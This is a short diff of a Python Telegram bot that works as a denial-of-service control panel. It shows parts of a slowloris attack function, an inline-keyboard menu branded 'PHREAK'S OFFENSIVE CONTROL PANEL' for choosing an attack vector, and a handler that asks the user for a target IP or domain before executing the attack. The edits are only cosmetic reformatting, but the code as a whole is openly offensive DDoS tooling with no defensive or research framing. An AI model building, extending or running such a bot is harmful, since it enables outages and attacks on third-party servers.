@@ -63,15 +63,12 @@ def slowloris(target):
         except Exception as e:
             print(f"Slowloris Error: {str(e)}", file=sys.stderr)
 
-# ===== COMMAND CENTER =====
+# ===== COMMAND CENTER -----
 @bot.message_handler(commands=['start'])
 def show_attack_menu(message):
     markup = types.InlineKeyboardMarkup(row_width=2)
     for num, desc in ATTACK_METHODS.items():
-        markup.add(types.InlineKeyboardButton(
-            f"{num}. {desc}", 
-            callback_data=f"attack_{num}")
-        )
+        markup.add(types.InlineKeyboardButton(f"{num}. {desc}", callback_data=f"attack_{num}"))
     bot.send_message(message.chat.id, 
         "<b>⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡</b>\n"
         "Select attack vector:\n\n"
@@ -87,9 +84,7 @@ def show_attack_menu(message):
 def set_attack_method(call):
     method_id = call.data.split('_')[1]
     user_attacks[call.message.chat.id] = {'method': method_id}
-    bot.send_message(call.message.chat.id, 
-        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n"
-        "Send target IP/Domain:")
+    bot.send_message(call.message.chat.id, f"⛔ {ATTACK_METHODS[method_id]} SELECTED\nSend target IP/Domain:")
 
 @bot.message_handler(func=lambda m: m.chat.id in user_attacks)
 def execute_attack(message):
